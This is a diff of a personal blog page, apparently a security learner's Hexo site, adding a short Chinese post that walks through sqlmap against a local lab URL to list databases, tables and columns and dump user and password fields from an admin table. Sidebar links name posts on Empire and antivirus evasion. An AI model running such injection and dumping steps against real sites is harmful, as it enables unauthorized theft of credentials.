@@ -64,6 +64,43 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-SQLlow等级工具注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2020-08-27T12:28:19.000Z" itemprop="datePublished">2020-08-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/">SQLlow等级工具注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>SQLMAP利用方式：<br>1.先去拿取这个网站的数据库<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> –current -db                            –得到当前数据库：sqltext<br>2.再拿取这个网站数据库的数据表<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext –tables                     –得到当前数据库中的数据表：admin、sqltext<br>3.然后再获取这张数据表中的数据列<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext -T admin –columns           –得到当前数据库中的数据表中的数据列：id、user、pwd<br>4.最后得到相应的数据<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext -T admin -C uesr,pwd –dump </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="cksskzywp00046gvj05sdb402" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-PHP学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
@@ -122,7 +159,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckspkdybd0003dsvjd7rr8g5w" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cksskzywh00016gvj57gucyv8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -159,7 +196,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckspkdyb60000dsvj89t04t21" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="cksskzyw600006gvjgy9jfc92" class="article-share-link">Share</a>
       
       
     </footer>
@@ -208,7 +245,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckspkdybh0009dsvjbfrwa5mn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="cksskzywy000a6gvj4am6dorg" class="article-share-link">Share</a>
       
       
     </footer>
@@ -254,6 +291,10 @@ default:
       <ul>
         
           <li>
+            <a href="/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/">端口转发和代理</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/">empire会话传递和代理</a>
           </li>
         
@@ -267,10 +308,6 @@ default:
         
           <li>
             <a href="/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/">免杀收尾和empire</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/12/%E5%85%8D%E6%9D%802/">免杀2</a>
           </li>
         
       </ul>
